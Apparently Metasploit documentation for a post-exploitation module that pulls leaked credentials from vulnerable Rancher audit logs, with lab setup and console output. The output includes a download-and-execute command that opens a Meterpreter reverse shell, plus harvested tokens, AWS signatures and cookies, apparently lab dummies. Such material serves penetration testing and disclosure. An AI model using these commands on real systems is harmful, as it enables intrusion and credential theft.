## Vulnerable Application

Rancher versions between 2.6.0-2.6.13, 2.7.0-2.7.9, 2.8.0-2.8.1 inclusive
contain a vulnerability where sensitive data is leaked into the audit logs.
Rancher Audit Logging is an opt-in feature, only deployments that have it
enabled and have AUDIT_LEVEL set to 1 or above are impacted by this issue.

Tested against rancher 2.6.0 and 2.8.1.

### Install

Run the following docker command: 
`docker run -d --restart=unless-stopped -p 80:80 -p 443:443 -e AUDIT_LEVEL=3 -v /var/log/rancher/auditlog:/var/log/auditlog --privileged rancher/rancher:v2.6.0`

You'll now need to grab the install key via `docker logs`: `docker logs <docker_id> 2>&1 | grep "Bootstrap Password:"`

Lets now add some data for the logs:

1. Click Cluster Management
1. Select Cloud Credentials:
  1. Click the hamburger in the top left corner
  1. Select Cluster Management
  1. Click Cloud Credentials, and Create
  1. Pick Digital Ocean
    1. Fill in random data, it doesn't have to validate and be a live account
    1. Click Create. It will fail, but the audit logs we need have been written
  1. Pick Amazon
    1. Fill in random data, it doesn't have to validate and be a live account
    1. Click Create. It will fail, but the audit logs we need have been written
1. Click your user icon in the top right corner
  1. Select Accounts & API Keys
    1. Click Create API Key
    1. Give it a name and click create. Write down these values
  1. Perform a request via curl (on the docker image is easiest) which will generate more logs (but ultimately fail): 
`curl -H "X-Api-Auth-Header: <your bearer token>" -H "X-Amz-Security-Token: FINDME" -k https://172.17.0.2/v3/clusters`

## Verification Steps

1. Install the application and generate data
1. Start msfconsole
1. Get a shell
1. Do: `use post/linux/gather/rancher_audit_log_leak`
1. Do: `set session [#]`
1. Do: `run`
1. You should get a table of leaky fields found

## Options

### LOGFILE

The log file to analyze. Defaults to `/var/log/auditlog/rancher-api-audit.log`

## Scenarios

### Rancher 2.6.0 on Docker

```
[*] Processing rancher_logs.rb for ERB directives.
resource (rancher_logs.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (rancher_logs.rb)> set target 7
target => 7
resource (rancher_logs.rb)> set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (rancher_logs.rb)> set lhost 172.18.0.1
lhost => 172.18.0.1
resource (rancher_logs.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] Using URL: http://172.18.0.1:8080/zpJT4e2V
[*] Server started.
[*] Run the following command on the target machine:
wget -qO gmZmOwc0 --no-check-certificate http://172.18.0.1:8080/zpJT4e2V; chmod +x gmZmOwc0; ./gmZmOwc0& disown
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.18.0.1:4444 -> 172.17.0.2:34252) at 2024-03-13 16:51:26 +0000
```

```
resource (rancher_logs.rb)> use post/linux/gather/rancher_audit_log_leak
resource (rancher_logs.rb)> set session 1
session => 1
resource (rancher_logs.rb)> set verbose true
verbose => true
msf6 post(linux/gather/rancher_audit_log_leak) > 
msf6 post(linux/gather/rancher_audit_log_leak) > run

[+] Rancher log saved to: /root/.msf4/loot/20240313165133_default_172.17.0.2_rancher.api.log_616439.txt
[+] Found X-Api-Auth-Header token-p6nzp:zcpscwmzbx2kvfdffl8lqlqv5564s98225zn5ds67rtnw5m4hcjlqs
[+] Found X-Amz-Security-Token FINDME
[+] Found X-Api-Auth-Header Bearer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[+] Found X-Api-Set-Cookie-Header: __cf_bm=2W30ytsdvsLv72Iok1yhwxxsb2vMTPSR7TBCwVZFSGA-1710342756-1.0.1.1-W82_TGzMA.9nV.Qan0XFdGijkdil8VjhuSHbCC85hD2XEsS9rEaR_IlX0X_hsDuDj52ULmlywjjTJZP5zkk503.D4IDGc30FExY2pUhDRyU; path=/; expires=Wed, 13-Mar-24 15:42:36 GMT; domain=.digitalocean.com; HttpOnly; Secure; SameSite=None
[+] Found X-Api-Auth-Header Bearer digital_ocean_access_token
[+] Found X-Api-Set-Cookie-Header: __cf_bm=MDIoCaX1Uv1po1JmVaiUvzljV4m9vovMhzjQBN36u2c-1710342849-1.0.1.1-GaceyvEmf5JRuEDxjuU.ByuyIEj6RtMkdN.QqbENHhCLLk.VLlSqn2kk6ykypIZqbpWgzQtOk6iamIROy456PtvgVL9PA3ZebG9CFh1y8IM; path=/; expires=Wed, 13-Mar-24 15:44:09 GMT; domain=.digitalocean.com; HttpOnly; Secure; SameSite=None
[+] Found X-Api-Auth-Header AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-content-sha256;x-amz-date;x-amz-user-agent, Signature=be70968f3e291c0dad80ea15daa220ab8e87d79b76f28e782319443a174aa626
[+] Found X-Api-Auth-Header AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-content-sha256;x-amz-date;x-amz-user-agent, Signature=32d930648433fbb8d4da9a26af23ec83ce0df0e9010e56da3b7ee2708cee0e75
[+] Found X-Api-Auth-Header AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-content-sha256;x-amz-date;x-amz-user-agent, Signature=6992fecba7ad5f33e0cf5ab5d86c4e7df8b332a74c861a5d3f05a65a5fbc9bed
[+] Leaked Information
==================

 Field                    Value                                                                                                                                                                       Location
 -----                    -----                                                                                                                                                                       --------
 Username                 admin                                                                                                                                                                       Requests
 X-Amz-Security-Token     FINDME                                                                                                                                                                      requestHeader
 X-Api-Auth-Header        token-p6nzp:zcpscwmzbx2kvfdffl8lqlqv5564s98225zn5ds67rtnw5m4hcjlqs                                                                                                          requestHeader
 X-Api-Auth-Header        Bearer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                                                                                                       requestHeader
 X-Api-Auth-Header        Bearer digital_ocean_access_token                                                                                                                                           requestHeader
 X-Api-Auth-Header        AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-conten  requestHeader
                          t-sha256;x-amz-date;x-amz-user-agent, Signature=be70968f3e291c0dad80ea15daa220ab8e87d79b76f28e782319443a174aa626
 X-Api-Auth-Header        AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-conten  requestHeader
                          t-sha256;x-amz-date;x-amz-user-agent, Signature=32d930648433fbb8d4da9a26af23ec83ce0df0e9010e56da3b7ee2708cee0e75
 X-Api-Auth-Header        AWS4-HMAC-SHA256 Credential=aws_key/20240313/us-west-2/ec2/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-request;content-length;content-type;host;x-amz-conten  requestHeader
                          t-sha256;x-amz-date;x-amz-user-agent, Signature=6992fecba7ad5f33e0cf5ab5d86c4e7df8b332a74c861a5d3f05a65a5fbc9bed
 X-Api-Set-Cookie-Header  __cf_bm=2W30ytsdvsLv72Iok1yhwxxsb2vMTPSR7TBCwVZFSGA-1710342756-1.0.1.1-W82_TGzMA.9nV.Qan0XFdGijkdil8VjhuSHbCC85hD2XEsS9rEaR_IlX0X_hsDuDj52ULmlywjjTJZP5zkk503.D4IDGc30FExY  responseHeader
                          2pUhDRyU; path=/; expires=Wed, 13-Mar-24 15:42:36 GMT; domain=.digitalocean.com; HttpOnly; Secure; SameSite=None
 X-Api-Set-Cookie-Header  __cf_bm=MDIoCaX1Uv1po1JmVaiUvzljV4m9vovMhzjQBN36u2c-1710342849-1.0.1.1-GaceyvEmf5JRuEDxjuU.ByuyIEj6RtMkdN.QqbENHhCLLk.VLlSqn2kk6ykypIZqbpWgzQtOk6iamIROy456PtvgVL9PA3ZebG9  responseHeader
                          CFh1y8IM; path=/; expires=Wed, 13-Mar-24 15:44:09 GMT; domain=.digitalocean.com; HttpOnly; Secure; SameSite=None

[*] Post module execution completed
msf6 post(linux/gather/rancher_audit_log_leak) > 
```
